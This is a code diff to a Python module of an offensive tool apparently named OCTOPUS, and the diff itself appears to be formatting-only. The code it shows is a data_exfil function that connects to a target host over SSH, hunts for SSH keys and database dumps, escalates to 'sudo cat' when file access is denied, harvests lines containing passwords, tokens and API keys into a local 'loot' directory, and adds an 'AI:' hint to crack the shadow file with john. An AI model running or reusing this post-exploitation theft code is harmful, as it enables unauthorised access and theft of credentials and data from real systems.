@@ -16,20 +16,25 @@ try:
     from config import CFG, find_all_wordlists, find_wordlist
 except ImportError:
     CFG = {}
-    def find_wordlist(cat): return ""
-    def find_all_wordlists(cat): return []
+
+    def find_wordlist(cat):
+        return ""
+
+    def find_all_wordlists(cat):
+        return []
+
 
 from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec
 
 # ANSI Colors
-C_GREEN  = "\033[92m"
+C_GREEN = "\033[92m"
 C_YELLOW = "\033[93m"
-C_RED    = "\033[91m"
-C_CYAN   = "\033[96m"
-C_GREY   = "\033[90m"
-C_BLUE   = "\033[94m"
+C_RED = "\033[91m"
+C_CYAN = "\033[96m"
+C_GREY = "\033[90m"
+C_BLUE = "\033[94m"
 C_MAGENTA = "\033[95m"
-C_RESET  = "\033[0m"
+C_RESET = "\033[0m"
 
 
 # PARAMIKO SSH HELPERS (shared across stages)
@@ -50,7 +55,7 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
 
     # Create persistent loot directory (not /tmp/ — survives reboots)
     loot_base = os.path.expanduser("~/OCTOPUS/loot")
-    exfil_dir = os.path.join(loot_base, host.replace('.', '_'))
+    exfil_dir = os.path.join(loot_base, host.replace(".", "_"))
     os.makedirs(exfil_dir, exist_ok=True)
     print(f"    {C_CYAN}[*] Loot directory: {exfil_dir}{C_RESET}")
 
@@ -120,7 +125,9 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
                 targets.append((f, f"ssh_key_{f.replace('/', '_')}"))
 
         # Find database dumps
-        db_files = _ssh_exec(client, "find / -name '*.sql' -o -name '*.dump' -o -name '*.db' 2>/dev/null | head -10", timeout=10)
+        db_files = _ssh_exec(
+            client, "find / -name '*.sql' -o -name '*.dump' -o -name '*.db' 2>/dev/null | head -10", timeout=10
+        )
         for line in db_files.splitlines():
             f = line.strip()
             if f:
@@ -137,7 +144,12 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
             if content and ("Permission denied" in content or "cannot open" in content.lower()):
                 if can_sudo and not is_root:
                     content = _ssh_exec(client, f"sudo cat {remote_path} 2>&1", timeout=10)
-                    if content and "Permission denied" not in content and "No such file" not in content and "[!]" not in content:
+                    if (
+                        content
+                        and "Permission denied" not in content
+                        and "No such file" not in content
+                        and "[!]" not in content
+                    ):
                         print(f" {C_GREEN}✓ {len(content)}B (via sudo){C_RESET}")
                     else:
                         # Preserve the remote error as evidence.
@@ -177,7 +189,9 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
                 output += "    ← CREDENTIALS in file\n"
                 # Preserve matching password lines as evidence.
                 for line in content.splitlines():
-                    if any(kw in line.lower() for kw in ['password', 'passwd', 'secret', 'token', 'api_key', 'db_pass']):
+                    if any(
+                        kw in line.lower() for kw in ["password", "passwd", "secret", "token", "api_key", "db_pass"]
+                    ):
                         print(f"      {C_RED}  {line.strip()[:100]}{C_RESET}")
                         output += f"    → {line.strip()[:100]}\n"
 
@@ -205,7 +219,9 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
 
             # Try cracking with john if available
             if shutil.which("john"):
-                output += "\nAI: Run john offline: john --wordlist=/usr/share/wordlists/rockyou.txt " + shadow_path + "\n"
+                output += (
+                    "\nAI: Run john offline: john --wordlist=/usr/share/wordlists/rockyou.txt " + shadow_path + "\n"
+                )
 
         output += f"\n{'═' * 60}\n"
         output += f"Files exfiltrated: {len(exfil_files)}\n"
@@ -215,6 +231,7 @@ def data_exfil(host: str, user: str, password: str, port: int = 22) -> str:
 
         # Import lazily to avoid the orchestrator/exfil dependency cycle.
         from core.killchain.orchestrator import _generate_target_report
+
         _generate_target_report(host, user, exfil_dir, exfil_files, output)
 
     finally:
